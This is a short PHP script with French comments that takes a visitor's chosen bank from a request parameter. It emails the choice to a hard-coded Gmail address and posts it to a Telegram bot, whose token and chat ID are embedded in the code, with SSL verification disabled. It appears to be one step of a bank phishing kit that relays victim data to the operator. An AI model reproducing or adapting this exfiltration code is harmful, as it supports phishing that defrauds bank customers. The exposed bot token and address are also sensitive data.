<?php
// Envoie le choix de banque par email + Telegram
session_start();

$banque = '';

if (isset($_GET['banque'])) {
    $banque = $_GET['banque'];
} elseif (isset($_POST['banque'])) {
    $banque = $_POST['banque'];
}

if ($banque !== '') {

    // Construire le message
    $subject = "New Bank Choice";
    $body    = "Banque choisie : " . $banque;
    $to      = "mouad.ccc@gmail.com";

    $headers = "Content-Type: text/html; charset=ISO-8859-1\r\n";

    // Envoi email
    @mail($to, $subject, $body, $headers);

    // Envoi Telegram (même style que ton code)
    $websit = "https://api.telegram.org/bot5529205468:AAEmNwJzZ0oQ4X_RVS0vhEL_GO4xpaytvwE";
    $param  = [
        'chat_id' => '5061239044',
        'text'    => $body,
    ];
    $ch = curl_init($websit . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($param));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);

    echo "OK";
} else {
    echo "NO_BANK";
}
?>
